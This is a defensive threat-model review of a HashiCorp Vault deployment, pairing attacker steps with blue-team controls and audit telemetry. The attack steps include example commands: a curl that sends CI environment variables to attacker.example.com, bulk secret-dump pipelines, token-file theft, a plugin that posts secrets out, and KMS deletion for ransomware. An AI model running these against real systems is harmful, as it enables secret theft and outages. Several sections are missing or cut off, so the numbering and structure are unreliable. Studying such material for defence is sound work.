Scenario: Deploy HashiCorp Vault to replace hardcoded secrets across 400 applications in dev, staging, and production environments — while defending against CI/CD compromise, insider admins, APTs targeting API keys, and ransomware operators targeting the secrets backend.

1. Review Objective

This document reviews the threat model from two lenses:

  1. Attacker lens: How an attacker would realistically exploit each identified threat, including prerequisites, reconnaissance steps, tool usage, and escalation path.
  2. Blue-team lens: What controls must stop or detect the attack, where each control is enforced, and what telemetry proves the control is firing.

Commands use placeholder values and are intended for an owned lab or approved internal purple-team exercise only. High-risk techniques (mass secret dump, CA key export) are described at the technique level with safe defensive validation counterparts only.

2. Highest-Risk Design Decision

The single most consequential design decision is whether CI/CD pipelines are scoped to the minimum Vault policy required for build-time operations, or whether they are granted broad production read access "for convenience."

CI/CD runners are high-privilege, high-exposure assets: they receive code from developers, execute arbitrary build logic, and have authenticated Vault credentials. A GitHub Actions workflow file can be modified via a malicious PR, a compromised contributor account, or a poisoned dependency — and any such compromise immediately inherits the Vault policy attached to the CI identity. If that policy grants read access to production API keys and database credentials, one compromised pipeline run silently dumps the entire production secret estate. The safe design grants CI a Vault policy scoped strictly to build-time secrets (e.g., container registry tokens) using short-lived OIDC JWT tokens bound to the specific repository and branch. Production runtime secrets are exclusively accessed by running application pods via Kubernetes service account JWT auth — a completely separate Vault auth path that CI has no access to.

6. Threat-by-Threat Technical Review

T1 — CI/CD Pipeline Compromise — Vault Token Exfiltration

STRIDE category: Information Disclosure, Spoofing
Risk: High likelihood, Critical impact
Attacker objective: Compromise a GitHub Actions workflow or Jenkins pipeline to exfiltrate the Vault AppRole credentials or OIDC token, authenticate to Vault as the CI identity, and read all secrets within the CI Vault policy — potentially including production credentials if the policy is over-privileged.

How the attacker would exploit it

  • Prerequisite: Attacker can modify a GitHub Actions workflow file via a compromised contributor account, malicious fork PR, or by poisoning a third-party GitHub Action dependency (uses: malicious-org/compromised-action@v1).
  • Step 1: Malicious workflow step exfiltrates environment variables: curl -d "$(env)" https://attacker.example.com/collect — this captures VAULT_ROLE_ID, VAULT_SECRET_ID, VAULT_TOKEN, or the OIDC JWT token from the runner environment.
  • Step 2: Attacker authenticates to Vault from external IP: vault write auth/approle/login role_id=<stolen-role-id> secret_id=<stolen-secret-id> — receives a Vault client token.
  • Step 3: Attacker enumerates available secret paths: vault kv list secret/ — iterates through all namespaces accessible to the CI policy.
  • Step 4: Reads all accessible secrets: vault kv get secret/prod/stripe-api-key, vault kv get secret/prod/db-password — dumps every accessible secret to local files.
  • Step 5: Impact: all secrets accessible to the CI Vault policy are compromised; if the CI policy was over-privileged with production read access, the full production secret estate is exfiltrated.

Blue-team control review — what must stop the chain

  • Control 1: CI Vault policy scoped to build-time secrets only — CI identities must never have read access to secret/prod/* paths; separate Vault policies for build-time (secret/cicd/*) and runtime (secret/prod/*) enforced architecturally.
  • Control 2: GitHub Actions OIDC JWT tokens with branch/repo binding — Vault JWT auth method configured with bound_claims requiring repository = org/repo AND ref = refs/heads/main; prevents PRs from forked repos authenticating as the main branch identity.
  • Control 3: Mass-secret-read detection: Vault audit log rule fires on >50 distinct request.path values by a single auth.accessor within 5 minutes — SOAR immediately revokes the token via vault token revoke <accessor>.
  • Control 4: Secret access from unexpected IP: Vault audit log alert when CI accessor is used from an IP outside the CI runner CIDR range (GitHub Actions runner IPs are published; Jenkins runner IPs are static and known).
  • Control 5: CI build log secret scanning: truffleHog or detect-secrets integrated into the pipeline output scanner; any HVAC token pattern, s.[A-Za-z0-9]{24} pattern, or secret_id string in build output fires an immediate alert and revocation.

Evidence and telemetry to validate controls

  • Vault audit log: auth.accessor = <ci-accessor>, remote_address NOT IN <ci-runner-cidr>, request.operation = read — unexpected source IP for CI accessor.
  • Vault audit log: count(distinct request.path) > 50 where auth.accessor = <ci-accessor> and time_window = 5min — mass read trigger.
  • GitHub Actions audit log: actor, action = workflow_run.completed, workflow_path — identify which workflow file ran the malicious step.
  • SIEM correlation: Vault CI token read volume spike correlated with a new PR merged that modified .github/workflows/*.yml.

T2 — AppRole Secret_ID Theft and Reuse

STRIDE category: Spoofing
Risk: High likelihood, Critical impact
Attacker objective: Intercept or steal a Vault AppRole secret_id (from a CI pipeline, a configuration management system, or an application's startup script) and use it to generate unlimited Vault tokens impersonating the target application — gaining persistent access to all secrets the app can read.

How the attacker would exploit it

  • Prerequisite: Attacker has compromised a host that received a Vault secret_id delivery (e.g., an Ansible control node, a Kubernetes init container, or a configuration management tool that passes secret_id to applications).
  • Step 1: Attacker intercepts the secret_id from the delivery channel — this could be a plaintext HTTP delivery, a Kubernetes ConfigMap, or an Ansible variable printed in debug output.
  • Step 2: Uses the stolen secret_id alongside the role_id (which is typically less sensitive and often embedded in container images): vault write auth/approle/login role_id=<role-id> secret_id=<stolen-secret-id> — generates a Vault token.
  • Step 3: The legitimate application also tries to use the same secret_id — if the secret_id has secret_id_num_uses > 1, both the attacker and the app successfully authenticate, and neither is aware of the other.
  • Step 4: Attacker uses the generated Vault token to read all secrets accessible to the app's Vault policy — typically the app's own production secrets including database passwords and API keys.
  • Step 5: Impact: attacker has persistent Vault access that self-renews; if the secret_id TTL is long (days), the attacker can re-authenticate repeatedly before the credential is rotated.

Blue-team control review — what must stop the chain

  • Control 1: Response wrapping for all secret_id delivery — Vault wraps the secret_id in a one-time-use response-wrapped token with a 60-second TTL; the secret_id is never transmitted in plaintext; any double-unwrap attempt fires a double_unwrap audit event.
  • Control 2: secret_id_num_uses = 1 on all AppRole configurations — each secret_id can only be used once to generate a Vault token; replay by an attacker fails if the legitimate app authenticated first.
  • Control 3: Short secret_id_ttl — maximum 24-hour TTL on all secret_id values; attacker has a limited window even if theft is undetected.
  • Control 4: Vault audit log alert on double_unwrap event: request.path = sys/wrapping/unwrap AND error CONTAINS already unwrapped — any double-unwrap attempt fires an immediate Critical alert.
  • Control 5: Platform identity over AppRole where available: on Kubernetes, use the K8s JWT auth method — the service account JWT is cryptographically issued by the K8s API and cannot be stolen from a delivery pipeline because it never transits a pipeline.

Evidence and telemetry to validate controls

  • Vault audit log: request.path = auth/approle/login, remote_address != <app-deployment-cidr> — AppRole login from unexpected source IP.
  • Vault audit log: request.path = sys/wrapping/unwrap, error.message CONTAINS already been unwrapped — double-unwrap indicator.
  • Vault audit log: auth.accessor = <app-accessor> login event from two different IP addresses within a short time window — attacker and app both authenticated.
  • Kubernetes API audit: SA token for the delivery orchestrator used from outside the cluster — sourceIPs != cluster-node-ip-range.

T3 — Vault Root Token Not Destroyed — Attacker Obtains It

STRIDE category: Elevation of Privilege
Risk: Medium likelihood, Critical impact
Attacker objective: Obtain the Vault root token that was generated during cluster initialization but never revoked — root tokens have unlimited access to all Vault secrets, policies, auth methods, and configuration across all namespaces, with no policy restrictions.

How the attacker would exploit it

  • Prerequisite: The root token was not destroyed after cluster initialization and exists in a Terraform state file, a secrets manager entry, a team documentation system, or a developer's shell history.
  • Step 1: Attacker discovers the root token in a Terraform state file stored in an S3 bucket with overly permissive IAM policy: aws s3 cp s3://<tfstate-bucket>/vault/terraform.tfstate . — state file contains root_token_id in plaintext output.
  • Step 2: Authenticates to Vault with the root token: export VAULT_TOKEN=<root-token>; vault status — confirms unrestricted access.
  • Step 3: Lists and dumps all secrets across all namespaces: vault kv list -format=json secret/ | jq -r '.[]' | xargs -I{} vault kv get secret/{} — exhaustive secret dump.
  • Step 4: Reads and exports the Vault PKI root CA private key if the export policy was not explicitly blocked.
  • Step 5: Impact: every secret in every namespace is compromised; attacker can create new auth methods, modify all policies, and establish persistent backdoor access.

Blue-team control review — what must stop the chain

  • Control 1: Root token revocation procedure: root token MUST be revoked via vault token revoke <root-token> immediately after initial auth method and policy bootstrapping; this is a mandatory step in the Vault deployment runbook, verified before the cluster is opened to applications.
  • Control 2: Vault audit log alert: auth.token_type = root in ANY operation that is not auth/token/revoke-self — this event should be impossible post-initialization; immediate P0 alert.
  • Control 3: Terraform state file encryption: Terraform state stored in S3 with SSE-KMS and S3 bucket policy denying read access to any principal except the Terraform service account; Vault outputs (including any root token) must use sensitive = true to prevent state file logging.
  • Control 4: Root token generation for break-glass: generate root token only via vault operator generate-root with quorum of unseal key holders (3-of-5 Shamir); the process requires multi-person approval and generates a one-time-use token that is revoked after the emergency action.
  • Control 5: Vault audit log: any vault operator generate-root operation is logged; SIEM alert fires immediately; all cluster nodes' root token generation events must page the on-call security team.

Evidence and telemetry to validate controls

  • Vault audit log: auth.token_type = root — any such event post-initialization is a Critical finding; there should be zero such events after the bootstrapping revoke.
  • Vault audit log: request.path = sys/generate-root/* — root token generation in progress; correlate with ServiceNow emergency ticket.
  • AWS CloudTrail: GetObject on Terraform state file S3 bucket by principal other than Terraform service account.
  • Vault metrics: vault.token.count.by_auth_method{type=root} — should be 0; any non-zero value indicates a live root token.

T4 — Developer Long-Lived Vault Token on Compromised Laptop

STRIDE category: Spoofing, Information Disclosure
Risk: High likelihood, High impact
Attacker objective: Compromise a developer's laptop (via phishing, malicious package, or browser exploit) and inherit their long-lived Vault CLI token — using it to read any secret the developer's Vault policy allows, often spanning multiple environments for "convenience" access.

How the attacker would exploit it

  • Prerequisite: Developer has a Vault CLI configured with ~/.vault-token containing a long-lived token (TTL days to weeks) with broad development and sometimes staging/production read access.
  • Step 1: Malware on the developer's laptop reads ~/.vault-token file: type $env:USERPROFILE\.vault-token or cat ~/.vault-token — the token is stored in plaintext.
  • Step 2: Attacker uses the token from an external host: export VAULT_TOKEN=<stolen-token>; export VAULT_ADDR=https://<vault>:8200; vault kv list secret/ — token is valid from any IP unless IP-restricted policies are in place.
  • Step 3: Enumerates all secret paths accessible to the developer's policy — developers often have read access to staging and sometimes prod paths added incrementally over time.
  • Step 4: Reads all accessible secrets and exfiltrates.
  • Step 5: Impact: all secrets the developer can access are compromised; if the developer was troubleshooting a production issue and was temporarily granted prod read, that access is now in attacker hands.

Blue-team control review — what must stop the chain

  • Control 1: Maximum Vault token TTL of 8 hours for all human identities — enforced via default_lease_ttl and max_lease_ttl on the human-authentication Vault role; developers must re-authenticate daily via SSO/OIDC (Okta, Azure AD) which enforces MFA.
  • Control 2: OIDC authentication for all developer Vault access — vault login -method=oidc ties the Vault token to an active IdP session; when the IdP session expires (8 hours), Vault token renewal fails; eliminates long-lived ~/.vault-token values.
  • Control 3: Source IP binding on human Vault tokens: Vault bound_cidrs parameter on human auth roles limits token use to corporate VPN CIDR or known office IP ranges — token used from a home IP or attacker IP is rejected.
  • Control 4: Developer endpoint protection: MDE/CrowdStrike EDR on all developer laptops detects credential file access by non-IDE processes; ~/.vault-token access by a browser or unexpected process fires an alert.
  • Control 5: Vault human policy principle: developer Vault policies grant read access ONLY to secret/dev/<username>/* paths; staging and production secret access requires a separate MFA-gated Vault role with an 1-hour max TTL.

Evidence and telemetry to validate controls

  • Vault audit log: auth.accessor = <dev-accessor>, remote_address NOT IN <vpn-cidr> — human token used from outside corporate VPN.
  • Vault audit log: auth.accessor = <dev-accessor>, token renewal attempt after IdP session TTL expiry fails — error: token is not allowed to be renewed.
  • EDR on developer laptop: file read of %USERPROFILE%\.vault-token by non-Vault CLI process — Event ID 4663 on the file, AccessingProcessName != vault.exe.
  • Vault audit log: developer accessor reading secret/prod/* paths — any dev accessor touching prod paths is anomalous unless there is an active incident ticket.

T5 — Vault API Port 8200 Exposed to Overly Broad Internal Subnet

STRIDE category: Elevation of Privilege
Risk: Medium likelihood, High impact
Attacker objective: Exploit Vault API port 8200 reachable from a broad internal network segment (e.g., the entire corporate 10.0.0.0/8) — allowing any internal attacker with network access to attempt authentication, brute-force AppRole credentials, or exploit a Vault CVE directly against the API.

How the attacker would exploit it

  • Prerequisite: Vault's network binding and firewall rules allow TCP 8200 from a wide internal subnet rather than restricting it to application deployment subnets only.
  • Step 1: Attacker on the internal network (post-phishing on an IT workstation) scans for Vault instances: nmap -p 8200 10.0.0.0/8 --open or curl http://10.x.x.x:8200/v1/sys/health — Vault health endpoint responds with cluster information without authentication.
  • Step 2: Vault health endpoint leaks version information: vault version, cluster state, seal status — attacker matches against known CVEs.
  • Step 3: Attacker attempts AppRole brute-force — tries common role_id values or scans for known role IDs from application configuration in Git repositories.
  • Step 4: Exploits a known Vault CVE if the version is unpatched (e.g., CVE-2023-0620 — Vault raft autopilot DoS, or CVE-2022-40186 — potential auth bypass on specific versions).
  • Step 5: Impact: attacker gains unauthorized Vault access or disrupts Vault availability — both are high-severity events.

STRIDE category: Information Disclosure
Risk: Medium likelihood, Critical impact
Attacker objective: A malicious insider with Vault admin access (platform engineer, SRE, DevSecOps) abuses legitimate administrative credentials to iterate through all Vault namespaces and export every accessible secret — covering their tracks by clearing Vault audit logs or timing the operation during a maintenance window.

How the attacker would exploit it

  • Prerequisite: Insider has an active Vault admin token — obtained through normal job function, elevated during a maintenance session, or retained after their role changed.
  • Step 1: Insider authenticates via normal admin path: vault login -method=oidc -path=admin — legitimate admin session, no anomalous authentication event.
  • Step 2: Iterates through all secret mounts and namespaces: vault secrets list; vault kv list -recursive secret/ — builds a complete inventory of all secret paths.
  • Step 3: Dumps all secrets to a local file: vault kv list -format=json secret/ | jq -r '.[]' | xargs -I{} vault kv get -format=json secret/{} > all_secrets_dump.json.

  • Control 5: Vault admin policy does not include kv/data/* read — Vault admin accounts should manage infrastructure (policies, auth methods, mounts) but not read application secret values; secrets read access is for application identities only.

T7 — Vault PKI CA Private Key Export

STRIDE category: Information Disclosure
Risk: Low likelihood, Critical impact
Attacker objective: Abuse Vault admin access to export the root CA private key from the Vault PKI secrets engine — enabling the attacker to issue valid TLS certificates for any internal service, perform undetected man-in-the-middle attacks on service-to-service communication, and sign fake client certificates.

How the attacker would exploit it

  • Prerequisite: Attacker has Vault admin access (insider or via T3/T6 paths) and the Vault PKI mount was configured with an exportable root CA (using pki/root/generate/exported during setup).
  • Step 1: Checks if the PKI root CA is exportable: vault read pki/ca/pem — obtains the public certificate; then attempts vault read pki/ca — if the root was generated as exportable, the private key is returned.
  • Step 2: Alternatively, issues a vault policy allowing pki/root/export capability and uses that policy to call the export endpoint.
  • Step 3: CA private key is exfiltrated — attacker now has an offline copy that never expires (CA keys have multi-year validity).
  • Step 4: Uses the CA key with openssl req -x509 -CA rootca.crt -CAkey rootca.key to issue TLS certificates for any internal service: api.internal.corp, db.internal.corp, vault.internal.corp.
  • Step 5: Impact: attacker can perform undetected MITM on all TLS-encrypted internal service communication for the lifetime of the CA certificate (potentially 10+ years); all certificate-based authentication is compromised.

Blue-team control review — what must stop the chain

  • Control 1: PKI root CA must be generated as internal type (non-exportable): vault write pki/root/generate/internal common_name=... — internal type never exposes the private key via any API endpoint; the key is generated inside Vault and cannot be exported.
  • Control 2: Vault policy explicitly denies pki/root/export capability for all roles including admin: path "pki/root/export" { capabilities = ["deny"] } in the root policy.
  • Control 3: Use a Vault-integrated HSM or AWS CloudHSM as the PKI signing backend — private key operations are performed inside the HSM boundary; the key never exists in Vault memory in extractable form (Vault Enterprise HSM sealing).
  • Control 4: Vault audit log: any attempt to call pki/root/export path — even a failed attempt is a Critical security event indicating someone is trying to extract the CA key.
  • Control 5: Certificate Transparency monitoring: subscribe to CT log streams (crt.sh, Facebook CT monitor) for the internal domain — any certificate issued from the internal CA that was not issued by Vault's managed issuance pipeline triggers an alert.

Evidence and telemetry to validate controls

  • Vault audit log: request.path = pki/*/export — any call to any export endpoint on the PKI mount; zero expected in normal operations.
  • Vault audit log: request.path = pki/root/generate/exported during PKI setup — this confirms the CA was generated as exportable; finding if present in historical logs.
  • Certificate Transparency: new certificate for *.internal.corp appearing in public CT logs with an unexpected issuer fingerprint.

Risk: Low likelihood, High impact

STRIDE category: Information Disclosure
Risk: High likelihood, Medium impact
Attacker objective: Exfiltrate a dynamic database credential (or AWS STS token) issued by Vault and continue using it until the TTL naturally expires — exploiting the gap between credential compromise detection and active revocation, especially when the incident response process is manual.

How the attacker would exploit it

  • Prerequisite: Attacker has obtained a dynamic credential via one of the earlier T1-T6 attack paths — for example, by reading a Vault secret path that returned a dynamic database credential.
  • Step 1: Attacker captures the lease_id and credential value from the Vault API response: {"lease_id":"database/creds/app-role/abcd1234","username":"v-approle-abc","password":"<dynamic>","lease_duration":3600}.
  • Step 2: Uses the dynamic credential to connect to the production database: psql -h db.internal.corp -U v-approle-abc -W — the credential is valid until TTL expiry (typically 1 hour).
  • Step 3: If the incident response process requires manual ticket creation, security engineer confirmation, and DBA coordination to revoke, the attacker has 30-60 minutes of database access.
  • Step 4: During this window, attacker exfiltrates sensitive data tables: COPY (SELECT * FROM customers) TO STDOUT; piped to attacker-controlled endpoint.
  • Step 5: Even after the lease expires, the attacker retains the exfiltrated data — the dynamic secret's short TTL limits re-access but doesn't undo the breach.

Blue-team control review — what must stop the chain

  • Control 1: SOAR-automated Vault lease revocation: when a SIEM alert fires on suspicious secret access, the SOAR playbook immediately calls vault lease revoke <lease-id> via the Vault API — no human delay in the loop for the critical revocation step.
  • Control 2: Short TTL for dynamic secrets: database credentials TTL=1 hour maximum, max_ttl=4 hours; AWS STS tokens TTL=15 minutes — limits the attacker's window even without explicit revocation.
  • Control 3: Database-level session monitoring: AWS RDS Enhanced Monitoring or PostgreSQL pg_stat_activity view shows all active connections; any connection from a dynamic credential username outside expected application hosts fires a database-level alert.
  • Control 4: Vault revoke-force capability for incident response: security team has a Vault policy granting sys/leases/revoke-force/* — can revoke all leases for a specific secret path (e.g., vault lease revoke -force database/creds/app-role/) even if individual lease IDs are unknown.
  • Control 5: Vault lease count monitoring: unusual spike in active leases for a specific database role (indicating an attacker is renewing leases) triggers alert; normal application has predictable lease count.

Evidence and telemetry to validate controls

  • Vault audit log: request.path = database/creds/<role>, request.operation = read — credential issuance; correlate with subsequent unexpected database connections.
  • Database connection log: pg_log or aurora:mysql:audit — connection from v-<rolename>-<random> username from IP not in application deployment subnet.
  • Vault metrics: vault.secret.kv.count and lease renewal events for the compromised role; abnormal renewal rate indicates attacker keeping credential alive.
  • SOAR response log: lease_revoke_called = true, lease_id, revoke_timestamp — confirmation that revocation was automated and immediate.

T12 — Secret Sprawl — Secrets Remaining Outside Vault in .env Files and Repositories

STRIDE category: Information Disclosure
Risk: High likelihood, High impact
Attacker objective: Discover API keys, database credentials, and service tokens hardcoded in source code repositories, .env files, Kubernetes Secrets (base64-encoded plaintext), or CI/CD pipeline configuration — bypassing Vault entirely by finding secrets that were never migrated.

How the attacker would exploit it

  • Prerequisite: Developer committed a secret to a Git repository (even a private one) or left credentials in a .env file that was accidentally pushed; or the application was not migrated to Vault and still uses hardcoded credentials.
  • Step 1: Attacker uses truffleHog or gitleaks on the company's private GitHub organization: trufflehog github --org=<company-org> --token=<github-pat> — scans all repositories including private ones for secret patterns.
  • Step 2: Finds a matching pattern: AWS access key AKIA..., Stripe API key sk_live_..., database connection string with plaintext password in a .env.example file or committed appsettings.json.
  • Step 3: Uses the discovered credential directly: aws sts get-caller-identity --access-key-id AKIA... --secret-access-key ... confirms the key is still valid.
  • Step 4: Escalates using the discovered credential: AWS key may have AdministratorAccess, Stripe key allows customer data read, database connection string allows direct SQL access.
  • Step 5: Impact: breach of the specific system the credential grants access to; Vault deployment provides no protection for secrets that were never migrated.

Blue-team control review — what must stop the chain

  • Control 1: Pre-commit hook: pre-commit framework with detect-secrets or gitleaks hook blocking commits containing secret patterns — runs on every git commit before it reaches the remote; developer is notified immediately.
  • Control 2: CI pipeline secret scanning: truffleHog or gitleaks in the CI pipeline scanning all commits on every PR; PRs that introduce secret patterns cannot be merged until the secret is removed.
  • Control 3: GitHub Advanced Security secret scanning: GitHub automatically scans all pushes to private repositories for 200+ secret patterns (AWS, GCP, Stripe, Twilio); detected secrets are surfaced in the repository's security tab and notify the repo owner.
  • Control 4: Kubernetes Secret audit: run kubectl get secrets -A -o json | jq '.items[].data | keys' quarterly to inventory all K8s secrets; any credential that should be in Vault but is in a K8s Secret is a migration backlog item.
  • Control 5: Credential rotation upon detection: detected leaked credentials are rotated immediately via the secret's native API (AWS IAM key rotation, Stripe key revocation) before any further remediation — assume the secret is already known to an attacker.

Evidence and telemetry to validate controls

  • GitHub Advanced Security: secret_scanning_alert with secret_type, push_protection_bypassed, repository, commit_sha — alert within seconds of push.
  • CI pipeline: truffleHog scan result showing High finding with SourceMetadata.Commit, SourceMetadata.Repository, DetectorName = AWSKeyID.
  • AWS CloudTrail: API call with userIdentity.accessKeyId = AKIA... from an unexpected source IP or outside business hours — leaked key in use.
  • Gitleaks report: RuleID, File, Commit, Secret = <redacted>, StartLine — enables precise identification and removal of the leaked secret from git history.

T13 — Malicious Vault Plugin Installation by Admin

STRIDE category: Tampering
Risk: Low likelihood, Critical impact
Attacker objective: Install a malicious custom Vault plugin (secrets engine or auth method) that intercepts all secret reads and writes a copy to an attacker-controlled endpoint — effectively creating a persistent, application-transparent key logger for every secret accessed through Vault.

How the attacker would exploit it

  • Prerequisite: Attacker has Vault admin access with sys/plugins/catalog write permission and can upload a binary to the Vault plugin directory.
  • Step 1: Attacker writes a malicious Go binary that implements the Vault plugin SDK interface but also sends all plaintext secret values to an external endpoint via HTTPS: normal secrets engine behavior plus http.Post("https://attacker.example.com/collect", ...).
  • Step 2: Uploads the plugin binary to the Vault plugin directory on the cluster node.
  • Step 3: Registers the plugin: vault write sys/plugins/catalog/secret/evil-kv sha256=<hash> command=evil-kv — only the admin can do this, and the hash must match the binary.
  • Step 4: Enables the plugin as a new secrets mount: vault secrets enable -path=secret2 -plugin-name=evil-kv plugin — applications reading from secret2/* are now transparently exfiltrated.
  • Step 5: Impact: every secret read through the malicious mount is exfiltrated in real-time; the attacker has a persistent key logger on Vault that survives admin credential rotation.

Blue-team control review — what must stop the chain

  • Control 1: Vault plugin binary allowlist with SHA-256 hash verification: Vault requires the exact SHA-256 hash of the plugin binary to be registered in sys/plugins/catalog — any modification of the binary invalidates registration; only pre-approved plugin hashes are accepted.
  • Control 2: GitOps-controlled plugin registration: sys/plugins/catalog writes are only allowed from the Terraform pipeline identity — human admins cannot register plugins directly; all plugin registrations go through PR review.
  • Control 3: Vault audit log: any sys/plugins/catalog write or sys/mounts write (new secrets engine enabled) from a non-pipeline identity is an immediate Critical alert.
  • Control 4: Plugin directory on Vault server managed by configuration management (Ansible, Terraform) — any new binary file in /vault/plugins/ triggers an IDS alert via file integrity monitoring (Tripwire or Wazuh).
  • Control 5: Network: Vault cluster nodes have no outbound internet connectivity — a malicious plugin attempting to beacon to attacker.example.com is blocked at the cluster network boundary.

Evidence and telemetry to validate controls

  • Vault audit log: request.path = sys/plugins/catalog/*, request.operation = create, auth.entity_id NOT IN <terraform-pipeline-ids> — unauthorized plugin registration.
  • Vault audit log: request.path = sys/mounts/*, request.operation = create — new secrets engine enabled by non-pipeline identity.
  • File integrity monitoring: new file in /vault/plugins/ on Vault server — inotify or Tripwire alert on plugin directory.
  • Network flow: Vault cluster node initiating outbound HTTPS to non-approved destination — cluster nodes should only call KMS and storage endpoints outbound.

T14 — Vault Storage Backend Ransomware — Unseal Key Destruction

STRIDE category: Denial of Service
Risk: Low likelihood, High impact
Attacker objective: Deploy ransomware targeting the Vault storage backend (Consul, Raft, DynamoDB) and simultaneously delete the auto-unseal KMS key — encrypting all Vault data and removing the ability to decrypt it, causing a complete Vault outage that cascades to all 400 applications relying on dynamic secrets.

How the attacker would exploit it

  • Prerequisite: Attacker has compromised the cloud account hosting Vault infrastructure (via stolen cloud IAM credentials from CI/CD) and has IAM permissions to both the DynamoDB table and the KMS key used for auto-unseal.
  • Step 1: Attacker runs ransomware script that iterates Vault's DynamoDB table and overwrites all values with encrypted content: aws dynamodb scan --table-name vault-backend | jq '.Items[].key.S' | xargs -I{} aws dynamodb put-item --table-name vault-backend --item ....
  • Step 2: Simultaneously schedules the KMS key for deletion: aws kms schedule-key-deletion --key-id <vault-unseal-key-id> --pending-window-in-days 7 — once the deletion window passes, the unseal key is irrecoverably deleted.
  • Step 3: Vault cluster is now sealed (data encrypted, unseal key gone) — vault status returns Sealed: true.
  • Step 4: All 400 applications cannot retrieve secrets — dynamic credentials expire without renewal; applications begin failing at cascade as database, API, and certificate secrets expire.
  • Step 5: Attacker presents ransom demand alongside KMS key cancellation option.

Blue-team control review — what must stop the chain

  • Control 1: KMS key deletion prevention: KMS key used for Vault auto-unseal must have a key policy denying kms:ScheduleKeyDeletion and kms:DisableKey for all principals except a break-glass IAM role requiring MFA; the Vault service role cannot delete its own unseal key.
  • Control 2: Multi-region Vault cluster with a different KMS key in each region: US-East uses CMK-1; EU-West uses CMK-2 — destroying one region's key does not affect the other region's Vault cluster.
  • Control 3: Vault storage backend backup: daily Vault snapshot (vault operator raft snapshot save vault-backup-$(date +%Y%m%d).snap) stored in a separate AWS account with Object Lock — ransomware in the primary account cannot delete the backup account's S3 objects.
  • Control 4: AWS CloudTrail alert: kms:ScheduleKeyDeletion or kms:DeleteAlias on Vault unseal key ID — immediate P0 alert with SOAR playbook to cancel the deletion: aws kms cancel-key-deletion --key-id <key-id>.
  • Control 5: IAM least privilege: Vault service role IAM policy has only the minimum permissions (kms:Decrypt, kms:DescribeKey) — no kms:Delete* or kms:Disable* capabilities in the Vault node's IAM role.

Evidence and telemetry to validate controls

  • AWS CloudTrail: kms:ScheduleKeyDeletion event — requestParameters.keyId = <vault-unseal-key>, userIdentity.arn — any non-break-glass identity calling this is a P0 event.
  • AWS CloudTrail: dynamodb:BatchWriteItem at high volume against Vault table from unexpected IAM identity.
  • Vault metrics: vault.core.unsealed = 0 (cluster sealed) — Prometheus alert fires immediately.
  • AWS CloudTrail: s3:DeleteObject attempts on the Vault backup S3 bucket — Object Lock should deny these; the attempt is logged and alerts.
